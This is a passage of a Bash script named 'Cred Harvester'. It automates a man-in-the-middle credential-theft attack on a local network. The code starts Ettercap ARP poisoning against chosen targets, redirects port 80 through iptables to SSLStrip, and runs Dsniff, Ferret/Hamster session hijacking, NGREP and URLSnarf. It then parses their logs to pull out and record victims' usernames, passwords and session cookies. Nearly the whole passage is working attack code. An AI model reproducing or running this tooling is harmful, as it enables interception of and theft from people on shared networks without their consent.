		tput rc;tput sc;tput cup 3 57; echo "$(tput setaf $color)NGREP$(tput sgr0)"; tput rc;
	elif [[ $program -eq 7 ]]; then
		tput rc;tput sc;tput cup 3 65; echo "$(tput setaf $color)URLSnarf$(tput sgr0)"; tput rc;
	elif [[ $program -eq 8 ]]; then
		tput cup 6 8;tput el;
	fi
	unset program color
}

fnHeader() {
	clear
	echo "$(tput setaf $Frame_Color)--------------------------------------------------------------------------------$(tput sgr0)"
	echo "$(tput setaf $Splat_Color) * * * * * * * * * * * * * * $(tput setaf $Title_Color)Cred Harvester Loading$(tput setaf $Splat_Color) * * * * * * * * * * * * * * $(tput sgr0)"
	echo "$(tput setaf $Frame_Color)--------------------------------------------------------------------------------$(tput sgr0)"
	echo "$(tput setaf $Frame_Color)     | $(tput setaf $Ettercap_Running)Ettercap$(tput setaf $Splat_Color) | $(tput setaf $SSLStrip_Running)SSLStrip$(tput setaf $Splat_Color) | $(tput setaf $Dsniff_Running)Dsniff$(tput setaf $Splat_Color) | $(tput setaf $Hamster_Running)Hamster$(tput setaf $Splat_Color) | $(tput setaf $Ferret_Running)Ferret$(tput setaf $Splat_Color) | $(tput setaf $NGREP_Running)NGREP$(tput setaf $Splat_Color) | $(tput setaf $URLSnarf_Running)URLSnarf$(tput setaf $Frame_Color) |$(tput sgr0)"
	echo -e "$(tput setaf $Frame_Color)     ----------------------------------------------------------------------$(tput sgr0)\n"
	echo -e "$(tput setaf 7)Status:$(tput sgr0) \n\n"
	echo -e "$(tput setaf $Splat_Color)~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ $(tput setaf $Title_Color)Cred Harvester Log$(tput setaf $Splat_Color) ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$(tput sgr0)\n"
}

fnEttercap() {
	Ettercap_Running=3
	fnCursor 1 3
	PID=`ps -ef | grep -v grep | grep -v xterm | grep -i "ettercap" | grep -i "\-l $Modified_Ettercap_Passive_Log" | awk '{ print $2 }'`
	if [[ -f "$Ettercap_Passive_Log" && "$PID" ]]; then
		Ettercap_Running=2
		fnCursor 1 2
		tput sc; fnCursor 8; echo -e "$(tput setaf 3)Ettercap and passive data found$(tput sgr0)"; tput rc
		return
	else
		if [[ -f $Ettercap_Passive_Log ]]; then
			fnCursor 8
			echo -e "$(tput setaf 2) $(tput sgr0) Removing old passive file...\c"
			rm $Ettercap_Passive_Log
			echo -e "$(tput setaf 2)Complete$(tput sgr0)"
		fi
	fi
	tput sc; fnCursor 8; echo -e "Loading Ettercap...\c"
	Etter_Command="ettercap -TQ -i $Interface -l $Modified_Ettercap_Passive_Log"
	if [[ $Hax -eq 0 && $Ettercap=3 ]]; then
		Etter_Command="$Etter_Command -M arp:remote"		
		if [[ -f /tmp/targets ]]; then
			Etter_Command="$Etter_Command -j /tmp/targets"
		fi
		if [[ "$Target1" ]]; then
			Etter_Command="$Etter_Command /$Target1/"
		else
			Etter_Command="$Etter_Command //"
		fi
		if [[ "$Target2" ]]; then
			Etter_Command="$Etter_Command /$Target2/"
		else
			Etter_Command="$Etter_Command //"
		fi
		if [[ $Use_XTERM -eq 1 ]]; then
			Etter_Command="xterm -T 'Ettercap' -geometry 80x24-0+0 -e 'tput reset; tput cup 0 0; tput setaf 1; echo -e \"\t\tPRESS Q TO SHUT DOWN ETTERCAP GRACEFULLY!\"; tput cup 1 0; for i in {0..79}; do echo -e \"~\c\"; done; tput sgr0; tput csr 2 23; tput cup 2 0; $Etter_Command' &"
		else
			Etter_Command="screen -dmS Ettercap -t Ettercap 'tput reset; tput cup 0 0; tput setaf 1; echo -e \"                     PRESS Q TO SHUT DOWN ETTERCAP GRACEFULLY!\"; tput cup 1 0; for i in {0..79}; do echo -e \"~\c\"; done; tput sgr0; tput csr 2 23; tput cup 2 0; $Etter_Command' &" 
		fi	
	else
		Etter_Command="$Etter_Command -u"
	fi
	set -m; eval $Etter_Command; set +m
	rc=$?
	if [[ $rc -eq 0 ]]; then
		sleep 3
		Ettercap_PID=`ps -ef | grep -v grep | grep -v xterm | grep -v "bash -c" | grep -i "ettercap" | grep -i "\-l $Modified_Ettercap_Passive_Log" | awk '{ print $2 }'`
		if [[ $Ettercap_PID ]]; then
			echo "$(tput setaf 2)Success$(tput sgr0) [PID: $Ettercap_PID]";  tput rc
			Ettercap_Running=2
			fnCursor 1 2
			Ettercap=1
		else
			echo "$(tput setaf 1)Failed to remain running$(tput sgr0)"; tput rc
			fnCursor 1 1
			Ettercap=0
			sleep 3
		fi
	else
		echo -e "$(tput setaf 1)Failed with error code $rc$(tput sgr0)"; tput rc
		sleep 3
		Ettercap_Running=1
		fnCursor 1 1
		Ettercap=0
	fi
}

fnSSLStrip() {
	SSLStrip_Running=3
	fnCursor 2 3
	PID=`pgrep -f "sslstrip"`
	count=0
	SSLPORT=( `iptables -t nat -L -n | grep "dpt:" | grep "80" | awk -F"redir ports" '{ print $2 }'` )
	while [[ $count -lt ${#SSLPORT[@]} ]]; do
		if [[ "$PID" && ${SSLPORT[$count]} && ${SSLPORT[$count]} -eq 10000 ]]; then
			tput sc; fnCursor 8; echo -e "$(tput setaf 1)SSLStrip is already running...$(tput sgr0)"; tput rc
			sleep 3
			return
		fi
	((count++))
	done
	tput sc; fnCursor 8; echo -e "Setting up ports & port forwarding"; tput rc
	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000 >/dev/null 2>&1
	IPTables=1
	echo '1' > /proc/sys/net/ipv4/ip_forward
	tput sc; fnCursor 8; echo -e "Enabling SSLStrip...\c"
	eval `python $SSLSTRIP_Location -p -f -k -w $tempssllog >/dev/null 2>&1 &`
	rc=$?
	if [[ $rc -eq 0 ]]; then
		sleep 3
		SSLStrip_PID=`ps -ef | grep -v grep | grep -v xterm | grep -i "python $SSLSTRIP_Location -p -f -k -w $tempssllog" | awk '{ print $2 }'`
		if [[ $SSLStrip_PID ]]; then
			echo "$(tput setaf 2)Success$(tput sgr0) [PID: $SSLStrip_PID]"; tput rc
			SSLStrip_Running=2
			fnCursor 2 2
			SSLStrip=1
		else
			echo "$(tput setaf 1)Failed to remain running$(tput sgr0)"; tput rc
			SSLStrip_Running=1
			fnCursor 2 1
			SSLStrip=0
			sleep 3
		fi
	else
		echo "$(tput setaf 1)Failed with error code $rc$(tput sgr0)"; tput rc
		SSLStrip_Running=1
		fnCursor 2 1
		SSLStrip=0
		sleep 3
	fi
	unset PID
}

fnDsniff() {
	Dsniff_Running=3
	fnCursor 3 3
	PID=`pgrep -f "dsniff"`
	if [[ "$PID" ]]; then
		PIDS=( $PID )
		Num_PIDS="${#PIDS[@]}"
		tput sc; fnCursor 8; echo -e "Killing previously running Dsniff sessions ($Num_PIDS found)...\c"
		count=0
		while [[ $count -ne $Num_PIDS ]]; do
			kill -9 ${PIDS[$count]} >/dev/null 2>&1
			((count++))
		done
		unset count PID PIDS
		sleep 3
		PID=`pgrep -f "dsniff"`
		if [[ ! "$PID" ]]; then
			echo "$(tput setaf 2)Success$(tput sgr0)"; tput rc
		else
			echo "$(tput setaf 1)Failed!$(tput sgr0)"; tput rc
			Dsniff=0
			Dsniff_Running=1
			fnCursor 3 1
			sleep 3
			return
		fi
		unset PID PIDS Num_PIDS	
	fi
	tput sc; fnCursor 8; echo -e "Running Dsniff...\c"
	eval `dsniff -c -m -n -i $Interface -w $tempdsnifflog >/dev/null 2>&1 &`
	rc=$?
	if [[ $rc -eq 0 ]]; then
		sleep 3
		Dsniff_PID=`ps -ef | grep -v grep | grep -v xterm | grep -i "dsniff" | awk '{ print $2 }'`
		if [[ $Dsniff_PID ]]; then
			echo "$(tput setaf 2)Success$(tput sgr0) [PID: $Dsniff_PID]"; tput rc
			Dsniff_Running=2
			fnCursor 3 2
			Dsniff=1
		else
			echo "$(tput setaf 1)Failed to remain running$(tput sgr0)"; tput rc
			Dsniff_Running=1
			fnCursor 3 1
			Dsniff=0
			sleep 3
		fi
	else
		echo "$(tput setaf 1)Failed with error code $rc$(tput sgr0)"; tput rc
		Dsniff_Running=1
		fnCursor 3 1
		Dsniff=0
		sleep 3
	fi
	unset PID
}

fnFerret() {
	#Check for 64-bit version of Backtrack.
	#If found, fix for ferret can be found at http://www.backtrack-linux.org/forums/showthread.php?t=46889
	Ferret_Running=3
	fnCursor 5 3
	PID=`pgrep -f "ferret"`
	if [[ "$PID" ]]; then
		PIDS=( $PID )
		Num_PIDS="${#PIDS[@]}"
		tput sc; fnCursor 8; echo -e "Killing previously running Ferret sessions ($Num_PIDS found)...\c"
		count=0
		while [[ $count -ne $Num_PIDS ]]; do
			kill -9 ${PIDS[$count]} >/dev/null 2>&1
			((count++))
		done
		unset count PID PIDS
		sleep 3
		PID=`pgrep -f "ferret"`
		if [[ ! "$PID" ]]; then
			echo "$(tput setaf 2)Success$(tput sgr0)"; tput rc
		else
			echo "$(tput setaf 1)Failed!$(tput sgr0)"; tput rc
			HandF=0
			Ferret_Running=1
			fnCursor 5 1
			unset PID PIDS Num_PIDS
			sleep 3
			return;
		fi
		unset PID PIDS Num_PIDS	
	fi
	tput sc; fnCursor 8; echo -e "Running Ferret...\c"
	eval `$Hamster_Ferret_Location/ferret -i $Interface >/dev/null 2>&1 &`
	rc=$?
	if [[ $rc -eq 0 ]]; then
		sleep 3
		Ferret_PID=`ps -ef | grep -v grep | grep -v xterm | grep -i "ferret" | awk '{ print $2 }'`
		if [[ $Ferret_PID ]]; then
			echo "$(tput setaf 2)Success$(tput sgr0) [PID: $Ferret_PID]"; tput rc
			Ferret_Running=2
			fnCursor 5 2
			fnHamster
		else
			echo "$(tput setaf 1)Failed to remain running. Try rebooting.$(tput sgr0)"; tput rc
			Ferret_Running=1
			fnCursor 5 1
			HandF=0
			sleep 3
		fi
	else
		echo "$(tput setaf 1)Failed with error code $rc$(tput sgr0)"; tput rc
		Ferret_Running=1
		fnCursor 5 1
		HandF=0
		sleep 3
	fi
}

fnHamster() {
	Hamster_Running=3
	fnCursor 4 3
	unset PID
	PID=`ps -ef | grep -v grep | grep -v xterm | grep -v ferret | grep -v firefox | grep -i "hamster" | awk '{ print $2 }'`
	if [[ "$PID" ]]; then
		PIDS=( $PID )
		Num_PIDS="${#PIDS[@]}"
		tput sc; fnCursor 8; echo -e "Killing previously running Hamster sessions ($Num_PIDS found)...\c"
		count=0
		while [[ $count -ne $Num_PIDS ]]; do
			kill -9 ${PIDS[$count]} >/dev/null 2>&1
			((count++))
		done
		unset count PID PIDS
		sleep 3
		PID=`ps -ef | grep -v grep | grep -v xterm | grep -v ferret | grep -v firefox | grep -i "hamster" | awk '{ print $2 }'`
		if [[ ! "$PID" ]]; then
			echo "$(tput setaf 2)Success$(tput sgr0)"; tput rc
		else
			echo "$(tput setaf 1)Failed!$(tput sgr0)"; tput rc
			sleep 3
			Hamster_Running=1
			fnCursor 4 1
			HandF=0
			if [[ "$Ferret_PID" ]]; then
				tput sc; fnCursor 8; echo -e "Terminating Ferret...\c"
				kill -9 $Ferret_PID >/dev/null 2>&1
				echo "Complete"; tput rc
				Ferret_Running=1
				fnCursor 5 1
				return
			fi
		fi
		unset PID PIDS Num_PIDS	
	fi
	if [[ $Flush_Cookies -eq 1 ]]; then
		PID=`ps -ef | grep -v grep | grep -v xterm | grep -i "firefox" | awk '{ print $2 }'`
		if [[ "$PID" ]]; then
			tput sc; fnCursor 8; echo -e "Firefox still running. Killing Firefox...\c"
			firefox=1
			PIDS=( $PID )
			Num_PIDS="${#PIDS[@]}"
			count=0
			while [[ $count -ne $Num_PIDS ]]; do
				kill -9 ${PIDS[$count]} >/dev/null 2>&1
				((count++))
			done
			unset count PID PIDS
			sleep 3
			PID=`ps -ef | grep -v grep | grep -v xterm | grep -i "firefox" | awk '{ print $2 }'`
			if [[ ! "$PID" ]]; then
				echo "$(tput setaf 2)Success$(tput sgr0)"; tput rc
				firefox=0
			else
				echo "$(tput setaf 1)Failed! Will NOT restore cookies!$(tput sgr0)"; tput rc
				rm $cookies_backup
				sleep 3
			fi
			unset PID PIDS Num_PIDS
		fi
		unset PID PIDS Num_PIDS
		cookies=`find $HOME/.mozilla -name "cookies.sqlite"`
		if [[ $cookies ]]; then
			tput sc; fnCursor 8; echo -e "Storing Firefox cookies in safe location...\c"
			mv $cookies $cookies_backup
			rc=$?
			if [[ $rc -eq 0 ]]; then
				echo "$(tput setaf 2)Success$(tput sgr0)"; tput rc
				found_cookie=1
			else
				echo "$(tput setaf 1)Unable to remove$(tput sgr0)"; tput rc
				sleep 3
			fi
		fi
	else
		tput sc; fnCursor 8; echo -e "$(tput setaf 1)WARNING:$(tput sgr0) Make sure you flush your cookies before using Hamster"; tput rc
		sleep 3
	fi
	tput sc; fnCursor 8; echo -e "Running Hamster...\c"
	eval `$Hamster_Ferret_Location/hamster >/dev/null 2>&1 &`
	rc=$?
	if [[ $rc -eq 0 ]]; then
		sleep 3
		Hamster_PID=`ps -ef | grep -v grep | grep -v xterm | grep -v firefox | grep -v ferret | grep -i "hamster" | awk '{ print $2 }'`
		if [[ "$Hamster_PID" ]]; then
			echo "$(tput setaf 2)Success$(tput sgr0) [PID: $Hamster_PID]"; tput rc
			Hamster_Running=2
			fnCursor 4 2
		else
			echo "$(tput setaf 1)Failed to remain running$(tput sgr0)"; tput rc
			Hamster_Running=1
			fnCursor 4 1
			HandF=0
			sleep 3
			if [[ "$Ferret_PID" ]]; then
				tput sc; fnCursor 8; echo -e "Terminating Ferret...\c"
				kill -9 $Ferret_PID >/dev/null 2>&1
				echo "$(tput setaf 2)Complete$(tput sgr0)"; tput rc
				Ferret_Running=1
				fnCursor 5 1
				sleep 1
				return
			fi
		fi
	else
		echo "$(tput setaf 1)Failed with error code $rc$(tput sgr0)"; tput rc
		Hamster_Running=1
		fnCursor 4 1
		HandF=0
		sleep 3
		if [[ $Ferret_PID ]]; then
			tput sc; fnCursor 8; echo -e "Terminating Ferret...\c"
			kill -9 $Ferret_PID >/dev/null 2>&1
			echo "$(tput setaf 2)Complete$(tput sgr0)"; tput rc
			Ferret_Running=1
			fnCursor 5 1
			sleep 1
			return
		fi
	fi
	unset PID
	if [[ $Browser -eq 1 ]]; then
		PID=`ps -ef | grep -v grep | grep -v xterm | grep -i "firefox" | awk '{ print $2 }'`
		if [[ "$PID" ]]; then
			tput sc; fnCursor 8; echo -e "Firefox still running. Killing Firefox...\c"
			firefox=1
			PIDS=( $PID )
			Num_PIDS="${#PIDS[@]}"
			count=0
			while [[ $count -ne $Num_PIDS ]]; do
				kill -9 ${PIDS[$count]} >/dev/null 2>&1
				((count++))
			done
			unset count PID PIDS
			sleep 3
			PID=`ps -ef | grep -v grep | grep -v xterm | grep -i "firefox" | awk '{ print $2 }'`
			if [[ ! "$PID" ]]; then
				echo "$(tput setaf 2)Success$(tput sgr0)"; tput rc
				firefox=0
			else
				echo "$(tput setaf 1)Failed to terminate Firefox!$(tput sgr0)"; tput rc
				sleep 3
				tput sc; fnCursor 8; echo "$(tput setaf 3)[-] Set proxy to http://localhost:1234 and visit http://hamster$(tput sgr0)"; tput rc
				sleep 3
				unset PID PIDS Num_PIDS
				return;
			fi
			unset PID PIDS Num_PIDS
		fi
		unset PID PIDS Num_PIDS
		tput sc; fnCursor 8; echo -e "Verifying Hamster launch page is open...\c"
		check=0
		count=0
		while [[ $check -ne 1 ]]; do
			Loaded=`nmap -Pn -p 1234 127.0.0.1 | grep 1234/tcp | awk '{print $2}'`
			if [[ "$Loaded" == "open" ]]; then
				echo "$(tput setaf 2)Success$(tput sgr0)"; tput rc
				check=1
				tput sc; fnCursor 8; echo -e "Enabling HTTP proxy...\c"
				export http_proxy="http://127.0.0.1:1234"
				export HTTP_PROXY=$http_proxy
				echo "$(tput setaf 2)Success$(tput sgr0)"; tput rc
				sleep 1
			elif [[ $count -eq 50 ]]; then
				echo "$(tput setaf 1)Failed$(tput sgr0)"; tput rc
				sleep 3
				Hamster_Running=1
				fnCursor 4 1
				HandF=0
				if [[ $Ferret_PID ]]; then
					tput sc; fnCursor 8; echo -e "Terminating Ferret...\c"
					kill -9 $Ferret_PID >/dev/null 2>&1
					echo "$(tput setaf 2)Complete$(tput sgr0)"; tput rc
					Ferret_Running=1
					fnCursor 5 1
					sleep 3
					return
				fi
			else
				sleep 3
				((count++))
			fi
		done
		tput sc; fnCursor 8; echo -e "Opening Hamster page in new tab...\c"
		eval `firefox http://hamster >/dev/null 2>&1 &`
		rc=$?
		if [[ $rc -eq 0 ]]; then
			echo "$(tput setaf 2)Success$(tput sgr0)"; tput rc
		else
			echo "$(tput setaf 1)Failed with error code $rc$(tput sgr0)"; tput rc
			sleep 3
			tput sc; fnCursor 8; echo "$(tput setaf 3)Go to http://hamster$(tput sgr0)"; tput rc
			sleep 3
		fi
	else	
		tput sc; fnCursor 8; echo "$(tput setaf 3)Set proxy to http://localhost:1234 and visit http://hamster$(tput sgr0)"; tput rc
		sleep 3
	fi
}

fnNGREP() {
	NGREP_Running=3
	fnCursor 6 3
	PID=`ps -ef | grep -v -w grep | grep -v xterm | grep -v -w watch | grep -i "ngrep" | awk '{ print $2 }'`
	if [[ "$PID" ]]; then
		tput sc; fnCursor 8; echo "$(tput setaf 3)NGREP with selected filter already running! Skipping NGREP$(tput sgr0)"; tput rc
		NGREP=0
		NGREP_Running=2
		fnCursor 6 2
		sleep 3
		return;
	fi
	unset PID
	tput sc; fnCursor 8; echo -e "Loading NGREP ($NGREP_filter_text)...\c"
	Command="ngrep -q -d $Interface -l -W single $NGREP_filter"
	eval $Command >$tempngreplog &
	rc=$?
	if [[ $rc -eq 0 ]]; then
		sleep 3
		NGREP_PID=`ps -ef | grep -v -w grep | grep -v -w watch | grep -v xterm | grep -i "ngrep" | awk '{ print $2 }'`
		if [[ $NGREP_PID ]]; then
			echo "$(tput setaf 2)Success$(tput sgr0) [PID: $NGREP_PID]"; tput rc
			NGREP=1
		else
			echo "$(tput setaf 1)Failed to remain running$(tput sgr0)"; tput rc
			NGREP_Running=1
			fnCursor 6 1
			NGREP=0
			sleep 3
			return;
		fi
	else
		echo -e "$(tput setaf 1)Failed with error code $rc$(tput sgr0)"; tput rc
		NGREP_Running=1
		fnCursor 6 1
		NGREP=0
		sleep 3
		return;
	fi
	unset Command
	tput sc; fnCursor 8; echo -e "Preloading log with NGREP startup messages...\c"
	Orig_IFS=$IFS
	IFS=$'\n'
	NGREP_Array=( `cat $tempngreplog` )
	IFS=$Orig_IFS
	unset Orig_IFS
	echo "$(tput setaf 2)Complete$(tput sgr0)"; tput rc
	NGREP_Running=2
	fnCursor 6 2
}

fnURLSnarf() {
	URLSnarf_Running=3
	fnCursor 7 3
	PID=`pgrep -f "urlsnarf"`
	if [[ "$PID" ]]; then
		PIDS=( $PID )
		Num_PIDS="${#PIDS[@]}"
		tput sc; fnCursor 8; echo -e "Killing previously running URLSnarf sessions ($Num_PIDS found)...\c"
		count=0
		while [[ $count -ne $Num_PIDS ]]; do
			kill -9 ${PIDS[$count]} >/dev/null 2>&1
			((count++))
		done
		unset count PID PIDS
		sleep 3
		PID=`pgrep -f "urlsnarf"`
		if [[ ! "$PID" ]]; then
			echo "$(tput setaf 2)Success$(tput sgr0)"; tput rc
		else
			echo "$(tput setaf 1)Failed!$(tput sgr0)"; tput rc
			URLSnarf_Running=1
			fnCursor 7 1
			URLSnarf=0
			sleep 3
			return;
		fi
		unset PID PIDS Num_PIDS	
	fi
	tput sc; fnCursor 8; echo -e "Running URLSnarf...\c"
	eval `urlsnarf -i $Interface  > $tempurlsnarflog 2>&1 &`
	rc=$?
	if [[ $rc -eq 0 ]]; then
		sleep 3
		URLSnarf_PID=`ps -ef | grep -v grep | grep -v xterm | grep -i "urlsnarf" | awk '{ print $2 }'`
		if [[ $URLSnarf_PID ]]; then
			echo "$(tput setaf 2)Success$(tput sgr0) [PID: $URLSnarf_PID]"; tput rc
			URLSnarf_Running=2
			fnCursor 7 2
			URLSnarf=1
		else
			echo "$(tput setaf 1)Failed to remain running$(tput sgr0)"; tput rc
			URLSnarf_Running=1
			fnCursor 7 1
			URLSnarf=0
			sleep 3
		fi
	else
		echo "$(tput setaf 1)Failed with error code $rc$(tput sgr0)"; tput rc
		URLSnarf_Running=1
		fnCursor 7 1
		URLSnarf=0
		sleep 3
	fi
	unset PID
}

fnCH_Log() {
	tput sc; fnCursor 8; echo "Selected programs loaded. Displaying logged creds..."; tput rc
	fnCursor 0 7
	tput cup 11 0;
	if [[ $Logging -ge 1 ]]; then
		echo -e "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Cred Harvester Log ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n" > $Final_Log
	fi
	Started=1
	while :; do
		sleep 6
		if [[ $SSLStrip -eq 1 ]]; then
			checkit=`ps -ef | grep -v grep | grep -v xterm | grep "sslstrip" | grep "$SSLStrip_PID"`
			if [[ "$checkit" && -f $tempssllog ]]; then
				tput sc; fnCursor 8; echo "Parsing SSLStrip Log..."; tput rc
				fnSSLStrip_Log
			else
				tput sc; fnCursor 8; echo -e "$(tput setaf 1)WARNING! SSLSTRIP QUIT UNEXPECTEDLY!$(tput sgr0)"; 	tput rc
				sleep 2
				count=0
				SSLStrip=0
				while [[ $count -lt 3 && $SSLStrip -ne 1 && $AutoRestart -eq 1 ]]; do
					fnSSLStrip
					((count++))
				done
			fi
			unset checkit
		fi
		if [[ $Ettercap -ge 1 ]]; then
			checkit=`ps -ef | grep -v grep | grep -v xterm | grep "ettercap"`
			if [[ "$checkit" && -f $Ettercap_Passive_Log ]]; then
				tput sc; fnCursor 8; echo "Parsing Ettercap Log..."; tput rc
				fnEttercap_Log
			else
				tput sc; fnCursor 8; echo -e "$(tput setaf 1)WARNING! ETTERCAP QUIT UNEXPECTEDLY!$(tput sgr0)"; 	tput rc
				sleep 3
				count=0
				if [[ Ettercap -eq 1 ]]; then
					Ettercap=0
					while [[ $count -lt 3 && $Ettercap -ne 1 && $AutoRestart -eq 1 ]]; do
						fnEttercap
						((count++))
					done
				else
					Ettercap=0
					fnCursor 1 1
				fi
			fi
			unset checkit
		fi
		if [[ $Dsniff -eq 1 ]]; then
			checkit=`ps -ef | grep -v grep | grep -v xterm | grep "dsniff" | grep "$Dsniff_PID"`
			if [[ "$checkit" && -f $tempdsnifflog ]]; then
				tput sc; fnCursor 8; echo "Parsing DSniff Log..."; tput rc
				fnDsniff_Log
			else
				tput sc; fnCursor 8; echo -e "$(tput setaf 1)WARNING! DSNIFF QUIT UNEXPECTEDLY!$(tput sgr0)"; tput rc
				sleep 3
				count=0
				Dsniff=0
				while [[ $count -lt 3 && $Dsniff -ne 1 && $AutoRestart -eq 1 ]]; do
					fnDsniff
					((count++))
				done
			fi
			unset checkit
		fi
		if [[ $URLSnarf_Filter -eq 1 ]]; then
			checkit=`ps -ef | grep -v grep | grep -v xterm | grep "urlsnarf" | grep "$URLSnarf_PID"`
			if [[ "$checkit" && -f $tempurlsnarflog ]]; then
				tput sc; fnCursor 8; echo "Parsing URLSnarf Log..."; tput rc
				fnURLSnarf_Log
			else
				tput sc; fnCursor 8; echo -e "$(tput setaf 1)WARNING! URLSNARF QUIT UNEXPECTEDLY!$(tput sgr0)"; 	tput rc
				sleep 3
				count=0
				URLSnarf=0
				while [[ $count -lt 3 && $URLSnarf -ne 1 && $AutoRestart -eq 1 ]]; do
					fnURLSnarf
					((count++))
				done
			fi
			unset checkit
		fi
		if [[ $NGREP -eq 1 && $NGREP_Display -eq 1 ]]; then
			checkit=`ps -ef | grep -v -w grep | grep -v xterm | grep -v -w watch | grep -i "ngrep" | awk '{ print $2 }'`
			if [[ "$checkit" && -f $tempngreplog ]]; then
				tput sc; fnCursor 8; echo "Parsing NGREP Log..."; tput rc
				fnNGREP_Log
			else
				tput sc; fnCursor 8; echo -e "$(tput setaf 1)WARNING! NGREP QUIT UNEXPECTEDLY!$(tput sgr0)"; tput rc
				sleep 3
				count=0
				NGREP=0
				while [[ $count -lt 3 && $NGREP -ne 1 && $AutoRestart -eq 1 ]]; do
					fnNGREP
					((count++))
				done
			fi
			unset checkit
		fi
		tput sc; fnCursor 8; echo "Selected programs loaded. Displaying logged creds..."; tput rc
	done
}

fnSSLStrip_Log() {
	NUMLINES=`cat "$SSL_Definitions" | wc -l`
	i=1
	while [[ $i -lt "$NUMLINES" ]]; do
		VAL1=`awk -v k=$i 'FNR == k {print $1}' "$SSL_Definitions"`
		VAL2=`awk -v k=$i 'FNR == k {print $2}' "$SSL_Definitions"`
		VAL3=`awk -v k=$i 'FNR == k {print $3}' "$SSL_Definitions"`
		VAL4=`awk -v k=$i 'FNR == k {print $4}' "$SSL_Definitions"`
		VAL5=`awk -v k=$i 'FNR == k {print $5}' "$SSL_Definitions"`
		VAL6=`awk -v k=$i 'FNR == k {print $6}' "$SSL_Definitions"`
		GREPSTR=`grep -a -A 1 "$VAL2" "$tempssllog" | grep -a "$VAL3" | grep -a $VAL4`
		if [[ "$GREPSTR" ]]; then
			check_line="$VAL1 `echo "$GREPSTR" | sed -e 's/.*'$VAL3'=/'$VAL3'=/' -e 's/&/ /' -e 's/&.*//'`"
			tempusername=`echo $check_line | awk '{print $2}'`
			temppassword=`echo $check_line | awk '{print $3}'`
			Username=`echo $tempusername | cut -c $VAL5-`
			Password=`echo $temppassword | cut -c $VAL6-`
			send_line="$VAL1 ($VAL2) - Username: ${Username//%40/@} - Password: $Password"
			fnStore_Creds "$send_line"
			unset check_line tempusername temppassword Username Password send_line VAL1 VAL2 VAL3 VAL4 VAL5 VAL6 GREPSTR
		fi
		((i++))
	done
}

fnDsniff_Log() {
	#dsniff -r $tempdsnifflog | sed 's/^.* -> //' | sed 's/-----------------/\x00/' | sort -z
	#$tempdsnifflog
	#Remove echo
	echo -e "\c"
}

fnEttercap_Log() {
	Orig_IFS=$IFS
	IFS=$'\n'
	etterlog -p $Ettercap_Passive_Log > /tmp/.tempetterlogoutput.txt 2>&1
	for LINE in `cat "/tmp/.tempetterlogoutput.txt"`; do
		eval `echo $LINE | awk '{ for(i=1;i<=NF;i++) { if ($i ~ /INFO/){site=$(++i);gsub (/.*\/\/|\/.*/,"",site); } if ($i ~ /USER/) {user=$(++i); } if ($i ~ /PASS/) {pass=$(++i); } if (i == NF) { printf "export Site=\"%s\" export Username=\"%s\" export Password=\"%s\"",site,user,pass; site=user=pass="";}}}'`
		if [[ "$Site" && "$Username" && "$Password" ]]; then
			count=0
			while [[ $count -lt $Number_Sites ]]; do
				checksite=`echo $Site | grep -i "${Sites[$count]}"`
				if [[ "$checksite" ]]; then
					checksite="${Sites[$count]} (${Sites_Detail[$count]})"
					count=$Number_Sites
				else
					unset checksite
				fi
				((count++))
			done
			if [[ ! "$checksite" ]]; then
				checksite="$Site"
			fi
			check_line="$checksite - Username: ${Username//%40/@} - Password: $Password"
			fnStore_Creds "$check_line"
			unset check_line
		fi
	done
	
	rm /tmp/.tempetterlogoutput.txt
	IFS=$Orig_IFS
	unset Orig_IFS
}

fnURLSnarf_Log() {
	Orig_IFS=$IFS
	IFS=$'\n'
	for LINE in `cat $tempurlsnarflog`; do
		command="echo $LINE $EGREP $Invert_EGREP"
		check_line=`eval $command`
		Number_Stored="${#URLSnarf_Array[@]}"
		found=0
		count=0
		if [[ "$check_line" ]]; then
			while [[ $count -ne $Number_Stored ]]; do
				if [[ "${URLSnarf_Array[$count]}" == "$check_line" ]]; then
					found=1
					count=$Number_Stored
				else
					((count++))
				fi
			done
			if [[ $found -eq 0 ]]; then
				URLSnarf_Array[$Number_Stored]="$check_line"
				echo -e "\n------ URLSnarf -----\n$check_line\n--- End URLSnarf ---"
				if [[ $Logging -ge 1 ]]; then
					echo -e "\n------ URLSnarf -----\n$check_line\n--- End URLSnarf ---" >> $Final_Log
				fi
			fi
		fi
		unset check_line Number_Stored found command
	done
	IFS=$Orig_IFS
	unset Orig_IFS
}

fnNGREP_Log() {
	count=0
	Orig_IFS=$IFS
	IFS=$'\n'
	found=0
	for LINE in `cat $tempngreplog`; do
		check_line="$LINE"
		Number_Stored="${#NGREP_Array[@]}"
		found=0	
		count=0
		if [[ "$check_line" ]]; then
			while [[ $count -le $Number_Stored ]]; do
				if [[ "${NGREP_Array[$count]}" == "$check_line" ]]; then
					found=1
					count=$Number_Stored
				else
					((count++))
				fi
			done
			if [[ $found -eq 0 ]]; then
				NGREP_Array[$Number_Stored]="$check_line"
				echo -e "\n------ NGREP -----\n$check_line\n--- End NGREP ---"
			fi		
		fi
		unset Number_Stored found check_line
	done
	IFS=$Orig_IFS
	unset Orig_IFS
}

fnStore_Creds() {
	Cred=$1
	if [[ -z "$1" ]]; then
		return;
	fi
	Number_Captured="${#Captured_Creds[@]}"
	count=0
	found=0
	while [[ $count -ne $Number_Captured ]]; do
		if [[ "${Captured_Creds[$count]}" == "$Cred" ]]; then
			found=1
		fi
		((count++))
	done
	if [[ $found -eq 0 ]]; then
		Captured_Creds[$Number_Captured]="$Cred"
		echo -e "$Cred\n"
		if [[ $Logging -ge 1 ]]; then
			echo -e "$Cred\n" >> $Final_Log
		fi
	fi
	unset Cred found
}

fnURLSnarf_Filter() {
	clear
	echo -e "$(tput setaf 1)                         ~ WARNING! ~"
	echo -e "DISPLAYING URLSNARF INFORMATION WILL LIKELY FLOOD THE DISPLAY!"
	echo -e "PLEASE LIMIT THE AMOUNT OF OUTPUT YOU DESIRE TO HELP PREVENT THIS!$(tput sgr0)"
	echo -e "\nAre you certain you wish to continue [no]? \c"
	read continue
	continue=`tr '[:upper:]' '[:lower:]' <<<$continue`
	if ! [[ $continue ]] || ! [[ $continue == "y" || $continue == "yes" ]]; then
		echo -e "\n*** Returning to program selection... ***"
		sleep 3
		fnMainMenu
	fi 
	#Start of information to INCLUDE
	count=0
	finished=0
